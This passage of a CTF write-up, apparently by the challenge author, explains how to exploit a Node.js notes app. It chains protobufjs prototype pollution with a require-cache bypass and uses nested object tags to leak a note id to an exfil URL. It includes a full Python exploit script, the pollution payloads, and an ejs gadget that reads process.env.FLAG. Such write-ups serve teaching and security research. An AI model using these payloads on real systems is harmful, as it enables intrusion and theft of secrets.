+</code></pre><p>The <code>/search/</code> endpoint uses the glob module with <code>./notes/${noteId}*</code> which can be used to search for a noteId character by character. Lets say if a noteId <code>abcd.json</code> exists and we send a request to <code>/search/a</code>, notes.length becomes 1 but <code>fs.accessSync(./notes/a.json)</code> will throw an error since a.json is not a valid noteId and it will return status 500. Instead if note searched was <code>/search/b</code> then glob.sync will set notes.length 0 and return status code 200 with message &ldquo;Not found&rdquo;.</p>
+<p>We&rsquo;ll take a look at how to exploit this later on but there is one more condition(middleware) set on the /search endpoint that we need to keep in mind.</p>
+<pre tabindex="0"><code class="language-javascript=" data-lang="javascript=">const restrictToLocalhost = (req, res, next) =&gt; {
+  const remoteAddress = req.connection.remoteAddress;
+  if (remoteAddress === &#39;::1&#39; || remoteAddress === &#39;127.0.0.1&#39; || remoteAddress === &#39;::ffff:127.0.0.1&#39;) {
+    next();
+  } else {
+    res.status(403).json({ Message: &#39;Access denied&#39; });
+  }
+};
+...
+
+...
+app.use(&#39;/search&#39;, restrictToLocalhost);
+</code></pre><p>The search endpoint is only accessible by localhost.
+Hence we need to find a way to make use of the admin bot to utilize the oracle in <code>/search</code> endpoint to leak flag note id.</p>
+<hr>
+<!-- raw HTML omitted -->
+<p>The challenge uses protobufjs 7.2.3 which has a prototype pollution CVE <a href="https://www.code-intelligence.com/blog/cve-protobufjs-prototype-pollution-cve-2023-36665" target="_blank">https://www.code-intelligence.com/blog/cve-protobufjs-prototype-pollution-cve-2023-36665</a>
+Calling protobuf.parse() with attacker controlled schema is possible due to the file write to settings.proto in the <code>/customise</code> endpoint</p>
+<pre tabindex="0"><code class="language-javascript=" data-lang="javascript=">const { data } = req.body;
+
+    let author = data.pop()[&#39;author&#39;];
+
+    let title = data.pop()[&#39;title&#39;];
+
+    let protoContents = fs.readFileSync(&#39;./settings.proto&#39;, &#39;utf-8&#39;).split(&#39;\n&#39;);
+...
+
+...
+if (author) {
+      protoContents[5] = `  ${author} string author = 3 [default=&#34;user&#34;];`;
+    }
+
+    if (title) {
+      protoContents[3] = `  ${title} string title = 1 [default=&#34;user&#34;];`;
+    }
+fs.writeFileSync(&#39;./settings.proto&#39;, protoContents.join(&#39;\n&#39;), &#39;utf-8&#39;);
+</code></pre><p>The endpoint takes author and title in an array called data and writes whatever is sent into the file <code>settings.proto</code>.</p>
+<p>| Note: a few filters were added here to minimize the playing field for prototype pollution gadgets but players still managed to bypass them :slightly_smiling_face: .</p>
+<p>At <code>/create</code>, protobuf.parse() is called. which ends up polluting the prototype.</p>
+<pre tabindex="0"><code class="language-javascript=" data-lang="javascript=">app.post(&#39;/create&#39;, (req, res) =&gt; {
+  requestBody=req.body
+  try{
+    schema = fs.readFileSync(&#39;./settings.proto&#39;, &#39;utf-8&#39;);
+    root = protobuf.parse(schema).root;
+    Note = root.lookupType(&#39;Note&#39;);
+    errMsg = Note.verify(requestBody);
+...
+</code></pre><!-- raw HTML omitted -->
+<p>Now that we have prototype pollution, we can make use of that to pollute some properties that will load an attacker note instead of Healthcheck note when admin bot visits.</p>
+<p>One such gadget can be seen in  nodejs require function. <a href="https://github.com/nodejs/node/blob/v20.2.0/lib/internal/modules/cjs/loader.js#L529" target="_blank">https://github.com/nodejs/node/blob/v20.2.0/lib/internal/modules/cjs/loader.js#L529</a> which lets us use <code>__proto__.path</code>, <code>__proto__.data.name</code> and <code>__proto__.data.exports</code> to load a &ldquo;malicious&rdquo; module/file specified in exports whenever require(&rsquo;name&rsquo;) is called.</p>
+<pre tabindex="0"><code class="language-javascript=" data-lang="javascript=">...
+function trySelf(parentPath, request) {
+  if (!parentPath) return false;
+
+  const { data: pkg, path: pkgPath } = readPackageScope(parentPath) || {};
+  if (!pkg || pkg.exports === undefined) return false;
+  if (typeof pkg.name !== &#39;string&#39;) return false;
+
+  let expansion;
+  if (request === pkg.name) {
+    expansion = &#39;.&#39;;
+  } else if (StringPrototypeStartsWith(request, `${pkg.name}/`)) {
+    expansion = &#39;.&#39; + StringPrototypeSlice(request, pkg.name.length);
+  } else {
+    return false;
+  }
+...
+</code></pre><p>readPackageScope is a function which looks for the package.json which contains details about modules to load but in this particular challenge, the package.json is deleted which makes the function return undefined.</p>
+<p>pkg.exports and pkg.name, now undefined, is taken from the prototype. This has been described in much better detail in the following blogs and I&rsquo;d recommend giving them a read.
+<a href="https://ctf.zeyu2001.com/2022/balsnctf-2022/2linenodejs" target="_blank">https://ctf.zeyu2001.com/2022/balsnctf-2022/2linenodejs</a>
+<a href="https://oatmeal.vip/security/web-learning/balsn-ctf-20222linenodejs/" target="_blank">https://oatmeal.vip/security/web-learning/balsn-ctf-20222linenodejs/</a></p>
+<h2 id="exploitation">Exploitation</h2>
+<p>Combining all the above parts, we can formulate a plan that involves the following steps:</p>
+<ul>
+<li>Use prototype pollution in protobufjs to &ldquo;remap&rdquo; Healthcheck note to attacker note.</li>
+<li>Attacker note contains payload which leaks flag id using <code>/search</code> endpoint.</li>
+</ul>
+<p>Let&rsquo;s take a closer look at how we can achieve this.</p>
+<pre tabindex="0"><code class="language-jsonld" data-lang="jsonld">{&#34;data&#34;:[{&#34;title&#34;:&#34;option(a).constructor.prototype.data={};optional&#34;},{&#34;author&#34;:&#34;optional&#34;}]}
+{&#34;data&#34;:[{&#34;title&#34;:&#34;option(a).constructor.prototype.data.name=\&#34;./notes/Healthcheck\&#34;;optional&#34;},{&#34;author&#34;:&#34;optional&#34;}]}
+{&#34;data&#34;:[{&#34;title&#34;:&#34;option(a).constructor.prototype.data.exports=\&#34;./notes/di1k8m47ob.json\&#34;;optional&#34;},{&#34;author&#34;:&#34;optional&#34;}]}
+</code></pre><p>Sending the above payloads to /customise endpoint and then <code>/create</code> to create a note will pollute the required fields which will set <code>/notes/di1k8m47ob.json</code> as the module to be loaded whenever <code>/notes/Healthcheck</code> is &ldquo;require&quot;d. ie. sending request to /view/Healthcheck after doing the pollution should result in di1k8m47ob.json being rendered.
+Here is where we will face another road-block.</p>
+<pre tabindex="0"><code class="language-javascript=" data-lang="javascript=">app.get(&#39;/view/:noteId&#39;, (req, res) =&gt; {
+  const noteId = req.params.noteId;
+
+  try {
+    let note=require.resolve(`./notes/${noteId}`);
+    if(!note.endsWith(&#34;.json&#34;)){
+      return res.status(500).json({ Message: &#39;Internal Server Error&#39; });
+    }
+
+    let noteData = require(`./notes/${noteId}`);
+    for (var key in module.constructor._pathCache) {
+      if (key.startsWith(&#34;./notes/&#34;+noteId)){
+        if (!module.constructor._pathCache[key].endsWith(noteId+&#34;.json&#34;)){
+          if (noteId===healthCheckId){
+            cleanserver();
+          }
+          delete module.constructor._pathCache[key];
+          return res.status(500).json({ Message: &#39;Internal Server Error&#39; });
+        }
+      }
+    }
+...
+</code></pre><p>There are checks implemented here on <code>_pathCache</code> to check whether the module that is loaded is the one that is actually required.</p>
+<p>This check can be bypassed but before that lets have a quick rundown of how <code>require()</code> actually works. (The challenge uses node 20.2.0 and a few changes have happened since then ).</p>
+<p><a href="https://github.com/nodejs/node/blob/beb0520af74ed20c3d48a1b4f6ca8a89664976c6/lib/internal/modules/cjs/loader.js#L1023" target="_blank">https://github.com/nodejs/node/blob/beb0520af74ed20c3d48a1b4f6ca8a89664976c6/lib/internal/modules/cjs/loader.js#L1023</a>
+The three functions involved here are <code>Module._load</code>, <code>Module._resolveFilename</code> and <code>module._findPath()</code>.
+When a file is require()’d for the first time, it does not exists in any cache. <code>Module._load</code> calls <code>Module._resolveFilename</code> and finally ends up in <code>module._findPath()</code>
+Module._findPath() is the function which finds valid file path. <a href="https://github.com/nodejs/node/blob/beb0520af74ed20c3d48a1b4f6ca8a89664976c6/lib/internal/modules/cjs/loader.js#L582" target="_blank">Valid extensions</a> are .js, .json and .node.
+After getting valid file name, the following code is run.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">filename</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">Module</span>.<span style="color:#a6e22e">_pathCache</span>[<span style="color:#a6e22e">cacheKey</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">filename</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">filename</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>This returns  filename and adds it to <code>_pathCache</code>.
+At Module._load, it is checked if cache[filename] is in require.cache. If not, after module is loaded, <code>require.cache[filename]=module</code> is added and relativeResolveCache[relResolveCacheIdentifier]=filename. is also set.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">Module</span>.<span style="color:#a6e22e">_cache</span>[<span style="color:#a6e22e">filename</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">module</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">parent</span> <span style="color:#f92672">!==</span> <span style="color:#66d9ef">undefined</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">relativeResolveCache</span>[<span style="color:#a6e22e">relResolveCacheIdentifier</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">filename</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span></code></pre></div><hr>
+<p>Now, for the case after a file has been loaded into cache: whenever <code>Module._load</code> is called, it first checks if the require()’d filepath has an entry in relativeResolveCache <strong>and</strong> if it is cached in require.cache.</p>
+<p>If yes, the exported module  in require.cache[filename] is returned from there.</p>
+<p>(Note - filename is relativeResolveCache[relResolveCacheIdentifier])</p>
+<p>If the require()’d filename is in relativeResolveCache but not in require.cache, it is deleted from relativeResolveCache and the rest of the code is executed.</p>
+<hr>
+<p>A more detailed look at the working can be found in the link below
+<a href="https://oatmeal.vip/security/web-learning/balsn-ctf-20222linenodejs/" target="_blank">https://oatmeal.vip/security/web-learning/balsn-ctf-20222linenodejs/</a></p>
+<hr>
+<p>Now, back to the road-block and how to get around it.
+When we use prototype pollution to &ldquo;remap&rdquo; lets say, note <code>abc</code> to <code>xyz</code>, At <code>Module._load</code>, relResolveCacheIdentifier is generated with <code>abc</code>. <code>Module._resolveFilename</code> and <code>Module._findPath</code> are called and _pathCache entry would look like <code>./notes/abc=&lt;path&gt;xyz.json</code>.
+<code>filename</code> returned to <code>Module._load</code> is that of <code>xyz</code> and that is xyz is loaded into <code>Module._cache[&lt;xyz filepath&gt;]</code>. <code>relativeResolveCache[relResolveCacheIdentifier of abc]</code> is set to <code>&lt;xyz filepath&gt;</code>.</p>
+<p>If <code>_pathCache</code> key and value do not match, the entry is deleted from <code>_pathCache</code>.</p>
+<p>If the attack is tried on Healthcheck noteId, the cleanserver() function also gets executed</p>
+<pre tabindex="0"><code class="language-javascript=" data-lang="javascript=">const cleanserver = () =&gt; {
+  Object.keys(require.cache).forEach(i =&gt; {
+    delete require.cache[i];
+  });
+};
+</code></pre><p>This basically means that if <code>/note/Healthcheck -&gt;  /note/attackernote</code> is set, cache is cleared and the require gadget will not work. Our plan for rebinding Healthcheck note to attacker note will fail except for the fact that when cache is cleared, relativeResolveCache entries are not deleted. The entry in relativeResolveCache is deleted when require tries to load the module and it does not exist in require.cache.</p>
+<p>This opens up the possiblity of the following
+First pollute <code>/note/Healthcheck</code> -&gt; <code>/note/attacker.json</code>
+Then visit <code>/view/Healthcheck</code> to delete pathcache entries which prevent note rendering.
+Then pollute <code>/note/random</code> -&gt; <code>/note/attacket.json</code> to add attacker.json to require.cache.
+Now when <code>/view/Healthcheck</code> is visited, <code>_pathCache</code> does not have any entries with Healthcheck in the key; relativeResolveCache [&lt;Healthcheck relResolveIdentifier&gt;] still contains the file path of attacker.json as value and loads attacker.json from cache.
+Hence we are able to bypass the check</p>
+<hr>
+<h3 id="final-steps">Final steps</h3>
+<p>Now that we have the ability to make the admin bot &ldquo;visit&rdquo; an attacker note we need to find a way to leak the flag note id from the <code>/search</code> endpoint without javascript.</p>
+<p>The <code>&lt;object data='link'&gt;other data&lt;/object&gt;</code> tag will render anything provided within the tag if the link returns 400/500 status code.
+We can nest tags like <code>&lt;object data='http://127.0.0.1:3000/search/a'&gt;object data='&lt;exfil_url&gt;/found/a'&gt;&lt;/object&gt;&lt;/object&gt;</code>. This will send callback to exfil_url if there exists a note starting with <code>a</code> as the response status code will be 500.</p>
+<p><em>This is where I might have overly complicated stuff</em></p>
+<p>The note id is 16 characters in length. We can leak id character by character by using <code>payload=payload+f&quot;&lt;object data='http://127.0.0.1:3000/search/{i}'&gt;&lt;object data='&lt;exfil_url&gt;/found/{i}'&gt;&lt;/object&gt;&lt;/object&gt;&quot;</code> and replacing <code>{i}</code> with the found id. In order to leak all characters, we can create multiple notes with one or two characters leak each. But here is where another problem occurs. If we want to pollute Healthcheck to a new note with the prototype won&rsquo;t be overwritten if we do the pollution again, it will create an array with both old and new polluted values. ie. data.name will become [&rsquo;/note/first&rsquo;,&rsquo;/notes/second&rsquo;]</p>
+<p>To get around this, we can pollute <code>data</code> once more, make it an array, then send an empty json <code>{}</code> to <code>/customise</code></p>
+<pre tabindex="0"><code class="language-javascript=" data-lang="javascript=">app.post(&#39;/customise&#39;,(req, res) =&gt; {
+  try {
+    const { data } = req.body;
+
+    let author = data.pop()[&#39;author&#39;];
+
+    let title = data.pop()[&#39;title&#39;];
+...
+</code></pre><p>data.pop() is called and the data array is cleared. Now polluting data.name and data.exports will take effect.</p>
+<p>The following script combines all these actions to leak the flag character by character:</p>
+<pre tabindex="0"><code class="language-python=" data-lang="python=">import requests
+from flask import Flask
+import string
+import time
+from threading import Thread
+
+
+charset=string.digits+string.ascii_lowercase
+url=&#34;&lt;instance_url&gt;&#34;
+proxies={&#34;http&#34;:&#34;http://127.0.0.1:8080&#34;,&#34;https&#34;:&#34;http://127.0.0.1:8080&#34;}
+useless={&#34;title&#34;:&#34;useless&#34;,&#34;content&#34;:&#34;just useless&#34;}
+
+app = Flask(__name__)
+
+def gen_payload(fchar):
+    payload=&#34;&#34;
+    for i in charset:
+        i=fchar+i
+        payload=payload+f&#34;&lt;object data=&#39;http://127.0.0.1:3000/search/{i}&#39;&gt;&lt;object data=&#39;&lt;exfil_url&gt;/found/{i}&#39;&gt;&lt;/object&gt;&lt;/object&gt;&#34;
+    return payload
+
+# Reset settings.proto to clean
+def reset_settings():
+	options={&#34;data&#34;:[{&#34;title&#34;:&#34;optional&#34;},{&#34;author&#34;:&#34;optional&#34;}]}
+	r=requests.post(url+&#34;customise&#34;, json=options, proxies=proxies, verify=False)
+	print(r.text)
+
+
+# Write payload note:
+def write_expl(expl):
+	reset_settings()
+	payload={&#34;title&#34;:&#34;asdf&#34;,&#34;content&#34;:expl}
+	r=requests.post(url+&#34;create&#34;, json=payload, proxies=proxies, verify=False)
+	print(&#34;Message From write_expl&#34;,r.json()[&#34;Message&#34;])
+	payload_id=r.json()[&#34;Noteid&#34;]
+	return payload_id
+
+
+def polluter(x,y):
+	options={&#34;data&#34;:[{&#34;title&#34;:&#34;option(a).constructor.prototype.data={};optional&#34;},{&#34;author&#34;:&#34;optional&#34;}]}
+	requests.post(url+&#34;customise&#34;, json=options, proxies=proxies, verify=False)
+	requests.post(url+&#34;create&#34;, json=useless, proxies=proxies, verify=False)
+	options={} # For data.pop()
+	requests.post(url+&#34;customise&#34;, json=options, proxies=proxies, verify=False)
+	#change name to healthcheck note id
+	options={&#34;data&#34;:[{&#34;title&#34;:&#34;option(a).constructor.prototype.data.name=\&#34;./notes/&#34;+x+&#34;\&#34;;optional&#34;},{&#34;author&#34;:&#34;optional&#34;}]}
+	requests.post(url+&#34;customise&#34;, json=options, proxies=proxies, verify=False)
+	requests.post(url+&#34;create&#34;, json=useless, proxies=proxies, verify=False)
+	#change name to exploit note id
+	options={&#34;data&#34;:[{&#34;title&#34;:&#34;option(a).constructor.prototype.data.exports=\&#34;./notes/&#34;+y+&#34;.json\&#34;;optional&#34;},{&#34;author&#34;:&#34;optional&#34;}]}
+	requests.post(url+&#34;customise&#34;, json=options, proxies=proxies, verify=False)
+	requests.post(url+&#34;create&#34;, json=useless, proxies=proxies, verify=False)
+
+
+def one_step(note):
+	requests.get(url+&#34;delete&#34;) # clear cache
+	note_id=write_expl(note)
+	polluter(&#34;Healthcheck&#34;,note_id)
+	requests.get(url+&#34;view/Healthcheck&#34;, verify=False) # get Healthcheck-&gt;note_id into resolve cache &amp; deletes require cache and pathcache
+	
+	polluter(&#34;777&#34;,note_id)
+	requests.get(url+&#34;view/777&#34;, verify=False) # get note_id into require cache so Healthcheck-&gt;note_id becomes alive again
+	requests.get(url+&#34;view/&#34;+note_id+&#34;?temp&#34;, verify=False) # delete exploit note from file system
+	r=requests.get(url+&#34;healthcheck&#34;, verify=False) 
+	print(r.text)
+	
+
+# Starting off
+#path has to be set only once
+#data pop trick also only once needed but does not affect much if done over again also
+
+print(&#34;wht&#34;)
+requests.packages.urllib3.disable_warnings()
+options={&#34;data&#34;:[{&#34;title&#34;:&#34;option(a).constructor.prototype.path=\&#34;./\&#34;;optional&#34;},{&#34;author&#34;:&#34;optional&#34;}]}
+requests.post(url+&#34;customise&#34;, json=options, proxies=proxies, verify=False)
+requests.post(url+&#34;create&#34;, json=useless, proxies=proxies, verify=False)
+
+
+def attack(found):
+	payload=gen_payload(found)
+	one_step(payload)
+
+
+@app.route(&#39;/&#39;)
+def hello():
+	attack(&#34;&#34;)
+	return &#39;Hello, attacker!&#39;
+
+@app.route(&#39;/found/&lt;note&gt;&#39;)
+def found(note):
+	print(&#34;Found: &#34;,note)
+	try:
+		thread=Thread(target=attack,args=(note,))
+		thread.start()
+	except Exception as e:
+		print(e)
+	return f&#39;You found: {note}&#39;
+
+
+if __name__ == &#39;__main__&#39;:
+    app.run(host=&#39;0.0.0.0&#39;)
+</code></pre><p>This will retreive all but last character of the flag note id which can be bruteforced to get the flag.</p>
+<hr>
+<p>Another simple approach to leaking the flag would be to create an iframe on the attacker note pointing to attacker controlled server where dynamic content can be served. While this is much more simple, I like the complicated approach more :)</p>
+<h3 id="other-interesting-solution">Other interesting solution</h3>
+<p>Believe it or not, giving free prototype pollution on a nodejs server with multiple dependencies to ctf players is not a good idea but it was cool to see all the gadgets that they found to solve this challenge. A few interesting ones are:</p>
+<ol>
+<li></li>
+</ol>
+<pre tabindex="0"><code>[Object: null prototype] {
+client: true,
+escapeFunction: &#39;1; return process.env.FLAG&#39;
+}
+</code></pre><p>This was the easiest solution that was overlooked and one of the main fixes in the revenge challenge. It used a known &ldquo;wont-fix&rdquo; ejs gadget to simply return process.env.FLAG and will give the flag on render of any page using ejs.</p>
+<p>A few teams also used similar approach to the above to get RCE on the server to get the flag.</p>
+<ol start="2">
+<li></li>
+</ol>
+<p>gadgets in puppeteer - <a href="https://gist.github.com/arkark/4a70a2df20da9732979a80a83ea211e2" target="_blank">https://gist.github.com/arkark/4a70a2df20da9732979a80a83ea211e2</a></p>
+<ol start="3">
+<li></li>
+</ol>
+<p>polluting express cache instead of require cache</p>
+<pre tabindex="0"><code>noteId: { match: &#39;Healthcheck&#39;, value: &#39;&lt;attackernote&gt;&#39; }
+</code></pre><p>This was quite interesting as the approach was very similar to the intended one but bypassed all restrictions on require cache.</p>
+<h3 id="final-thoughts">Final thoughts</h3>
+<p>The design of this challenge started out based on research done during solving of <a href="https://ctftime.org/task/24394" target="_blank">“required”</a>, a reversing challenge from hxpCTF 2022. Even though it seems like no one caught on to the weird caching problems that arise from the way prototype pollution gadget and cache&rsquo;s interact with each other, the methods players used were very interesting.</p>
+  
+  <hr>
+<div class="footer">
+    
+	    
+            <a class="previous-post" href="/posts/awesomenotes2-hackluctf2023/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>Awesomenotes II - Hack.lu CTF 2023</a>
+        
+	    
+    
+</div>
+
+  
+</div>
+            </main>
+            
+  
+    <div class="article-toc ">
+    <div class="toc-wrapper">
+      <h4 id="contents"></h4>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#challenge-description">Challenge Description</a></li>
+    <li><a href="#analysis">Analysis</a></li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ul>
+        <li><a href="#final-steps">Final steps</a></li>
+        <li><a href="#other-interesting-solution">Other interesting solution</a></li>
+        <li><a href="#final-thoughts">Final thoughts</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+  
+
+        </div>
+    </body>
+</html>
